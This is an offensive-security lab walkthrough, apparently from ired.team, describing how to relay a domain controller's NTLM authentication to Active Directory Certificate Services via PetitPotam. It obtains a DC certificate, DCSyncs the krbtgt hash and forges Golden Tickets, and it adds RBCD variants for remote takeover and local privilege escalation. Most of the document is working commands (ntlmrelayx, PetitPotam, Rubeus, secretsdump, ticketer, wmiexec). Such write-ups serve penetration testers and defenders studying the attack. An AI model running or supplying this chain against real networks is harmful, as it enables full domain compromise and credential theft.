# ADCS + PetitPotam NTLM Relay: Obtaining krbtgt Hash with Domain Controller Machine Certificate

Source: https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/adcs-+-petitpotam-ntlm-relay-obtaining-krbtgt-hash-with-domain-controller-machine-certificate

## Conditions for Vulnerability

- ADCS configured to allow NTLM authentication
- NTLM authentication not protected by EPA or SMB signing
- ADCS running Certificate Authority Web Enrollment or Certificate Enrollment Web Service

## Attack Flow

1. Foothold in AD network with misconfigured ADCS
2. Setup NTLM relay listener on attacker box (relay to ADCS)
3. Force target DC to authenticate to relay (PetitPotam/PrintSpooler)
4. DC authenticates to relay
5. Relay forwards DC$ auth to ADCS
6. ADCS issues certificate for DC$ computer account
7. Use DC's cert to request Kerberos TGT
8. Use DC TGT to DCSync → pull NTLM hash of `krbtgt`
9. Use `krbtgt` hash to forge Golden Tickets → Domain Admin

## Lab Setup (Domain Takeover)

| Machine | IP | Role |
|---------|-----|------|
| Kali | 10.0.0.5 | NTLM relay |
| DC01 | 10.0.0.6 | Target DC |
| CA01 | 10.0.0.10 | Certificate Authority |
| WS01 | 10.0.0.7 | Initial foothold |

## Tools Setup

```bash
# Clone impacket ADCS branch
git clone https://github.com/ExAndroidDev/impacket.git
cd impacket && git checkout adcs
pip3 install -r requirements.txt && pip3 install .
```

Find ADCS servers:
```
certutil.exe -config - -ping
```

## Execution

### 1. Setup NTLM Relay
```bash
# On Kali (10.0.0.5), relay DC01 auth to CA01 cert enrollment
python3 ntlmrelayx.py -t http://ca01/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```

### 2. Force DC01 to Authenticate (PetitPotam)
```bash
# From WS01
python3 PetitPotam.py 10.0.0.5 10.0.0.6
```

### 3. Request TGT with Certificate
```powershell
# On WS01 with Rubeus
Rubeus.exe asktgt /user:DC01$ /certificate:<base64-cert> /ptt
klist
```

### 4. DCSync → Get krbtgt Hash
```bash
python3 secretsdump.py -just-dc-user krbtgt -k -no-pass dc01.offense.local
```

### 5. Golden Ticket
```bash
python3 ticketer.py -nthash <krbtgt-hash> -domain-sid <sid> -domain offense.local Administrator
```

## RBCD: Remote Computer Takeover via NTLM Relay

Lab Setup for RBCD variant:
```
10.0.0.5 - Kali (NTLM relay)
10.0.0.7 - WS01 (target to takeover via RBCD)
10.0.0.6 - DC01
10.0.0.10 - CA01 (used to coerce WS01 auth)
```

### Setup relay with --delegate-access
```bash
python3 ntlmrelayx.py -t ldaps://dc01 --delegate-access
```

### Coerce WS01 from CA01
```bash
python3 PetitPotam.py 10.0.0.5 10.0.0.7
```
→ Relay creates new machine account (e.g., `QUAIIVVE$`) and sets RBCD on WS01

### Impersonate DA on WS01
```powershell
# Calculate RC4 hash of new machine account password
Rubeus.exe hash /password:<password>

# S4U
Rubeus.exe s4u /user:QUAIIVVE$ /rc4:<hash> /impersonateuser:administrator /msdsspn:cifs/ws01 /ptt
```

## RBCD: Local Privilege Escalation

Prerequisite: `ms-DS-MachineAccountQuota: 10` (default — domain users can add machine accounts)

Same NTLM relay → RBCD attack, then:
```bash
# Convert TGS kirbi to ccache
python3 ticketConverter.py admin.kirbi admin.ccache
export KRB5CCNAME=admin.ccache
python3 wmiexec.py -k -no-pass administrator@ws01.offense.local
```

## PetitPotam Blocked?
Alternative coercion: PrintSpooler (MS-RPRN), DFSCoerce, ShadowCoerce

## Notes
- Privileged accounts connecting to workstations can also be targeted this way
- Stop SMB service first (requires local admin + reboot) to relay on port 445
- WebClient service must be running on target for HTTP-based coercion
